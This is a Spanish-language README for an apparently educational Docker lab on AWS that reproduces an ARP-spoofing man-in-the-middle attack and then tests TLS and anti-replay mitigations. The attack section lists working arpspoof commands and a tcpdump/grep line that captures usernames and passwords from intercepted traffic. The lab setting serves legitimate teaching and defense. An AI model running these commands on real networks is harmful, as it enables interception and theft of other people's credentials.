# Análisis Forense de Ataques MitM en Infraestructura Docker (AWS)

Este repositorio contiene la Infraestructura como Código (IaC) y los scripts en Python necesarios para replicar un ataque Man-in-the-Middle (MitM) de Capa 2 en entornos de contenedores.

Además, incluye implementaciones criptográficas progresivas para su mitigación, culminando en una arquitectura Zero Trust con protección Anti-Replay.

Este proyecto fue desarrollado para analizar las vulnerabilidades de los dominios de difusión sin estado (redes bridge de Docker) frente a adversarios internos.

---

# Descripción General

El laboratorio implementa un entorno aislado basado en Docker para demostrar:

- Ataques Man-in-the-Middle (MitM) mediante ARP Spoofing.
- Captura de tráfico en redes bridge Docker.
- Vulnerabilidades de protocolos HTTP sin cifrado.
- Mitigación usando TLS.
- Protección avanzada usando arquitectura Zero Trust.
- Prevención de Replay Attacks mediante tokens y validación criptográfica.

---

# Requisitos de Infraestructura

Para garantizar la reproducibilidad exacta del experimento, se recomienda el siguiente entorno:

| Componente | Recomendación |
|---|---|
| Proveedor Cloud | Amazon Web Services (AWS) |
| Instancia | `EC2 t3.micro (us-east-1)` |
| Sistema Operativo | Amazon Linux 2023 |
| Dependencias Base | Docker y Docker Compose instalados |

---

# Preparación del Entorno
## Clonar el Repositorio

```bash
git clone (https://github.com/Aleortz/mitm-docker-aws)
cd mitm-docker-aws
```

---
Instalar Docker y Docker Compose en el host EC2.

Verificar instalación:

```bash
docker --version
docker-compose --version
```

---

# Despliegue del Entorno

---

## Levantar la Infraestructura

```bash
docker-compose up -d
```

Este comando iniciará:

- Servidor
- Víctima
- Atacante

Todos dentro de una red virtual aislada.

---

## Verificar Contenedores

```bash
docker ps
```

---

# Topología de Red

La red `lab_net` utilizará el rango:

```text
10.0.0.0/24
```

## Direcciones IP

| Nodo | Dirección IP |
|---|---|
| Servidor | `10.0.0.10` |
| Víctima | `10.0.0.20` |
| Atacante (Kali) | `10.0.0.30` |

---

# Preparación del Ataque (Nodo Atacante)

Para ejecutar el ataque MitM es necesario acceder al contenedor atacante, habilitar el forwarding y ejecutar el ARP Spoofing.

---

## 1. Acceder al Contenedor Atacante

```bash
docker exec -it attacker_node /bin/bash
```

---

## 2. Verificar IP Forwarding

El atacante debe actuar como router transparente para evitar una Denegación de Servicio (DoS).

```bash
sysctl net.ipv4.ip_forward
```

Resultado esperado:

```bash
net.ipv4.ip_forward = 1
```

---

## 3. Ejecutar ARP Spoofing Bidireccional

```bash
arpspoof -i eth0 -t 10.0.0.20 10.0.0.10 &
arpspoof -i eth0 -t 10.0.0.10 10.0.0.20 &
```

Estos comandos envenenan simultáneamente las tablas ARP de:

- Víctima
- Servidor

---

## 4. Iniciar Captura Forense

```bash
tcpdump -i eth0 -A | grep -E "username|password"
```

Este comando monitorea tráfico interceptado en tiempo real.

---

# Fases Experimentales

Abrir dos terminales SSH adicionales conectadas al host EC2 para controlar:

- Servidor
- Víctima

---

# Fase I: Tráfico en Texto Plano (HTTP)

Esta fase demuestra la vulnerabilidad crítica de protocolos sin protección.

---

## Terminal del Servidor

```bash
docker exec -it server_node /bin/sh
python server/server_http.py
```

---

## Terminal de la Víctima

```bash
docker exec -it victim_node /bin/sh
python victim/client_http.py
```

---

## Resultado Esperado

En la terminal del atacante se visualizarán credenciales en texto plano:

```text
username=admin&password=...
```


# Fase II: Túnel TLS Estándar (Confidencialidad)

Esta fase introduce cifrado de transporte mediante TLS.

---

## Generar Certificado Autofirmado

Antes de ejecutar esta fase, generar un certificado dentro de `/server`:

```bash
openssl req -x509 -newkey rsa:4096 -keyout server/key.pem -out server/cert.pem -days 365 -nodes
```

---

## Terminal del Servidor

Detener el proceso anterior (`Ctrl + C`) y ejecutar:

```bash
python server/server_https.py
```

---

## Terminal de la Víctima

```bash
python victim/client_https.py
```



# Fase III: Arquitectura Zero Trust (Cifrado Híbrido + Anti-Replay)

Aunque TLS protege la confidencialidad, aún existen vulnerabilidades frente a Replay Attacks.

Esta fase implementa:

- Handshake RSA personalizado
- AES-CBC (Fernet)
- Caché temporal de tokens
- Validación Anti-Replay

---

## Componentes de Seguridad

```python
seen_tokens
```

---

## Terminal del Servidor

Detener el proceso anterior y ejecutar:

```bash
python server/server_custom_tls.py
```

---

## Terminal de la Víctima

```bash
python victim/client_custom_tls.py
```




# Troubleshooting

## Los contenedores no aparecen en `docker ps`

Reiniciar despliegue:

```bash
docker-compose down
docker-compose up -d
```

---

## `ip_forward` retorna `0`

Habilitar forwarding manualmente:

```bash
sysctl -w net.ipv4.ip_forward=1
```

---

## `arpspoof` no funciona

Verificar:

- conectividad entre contenedores
- interfaz correcta (`eth0`)
- permisos del contenedor atacante
- instalación de `dsniff`

---

## `tcpdump` no captura tráfico

Verificar:

- que ARP Spoofing esté activo
- existencia de tráfico HTTP/HTTPS
- interfaz correcta

---

## Error TLS

Verificar existencia de:

```text
server/key.pem
server/cert.pem
```

Regenerar certificados si es necesario:

```bash
openssl req -x509 -newkey rsa:4096 -keyout server/key.pem -out server/cert.pem -days 365 -nodes
```



---


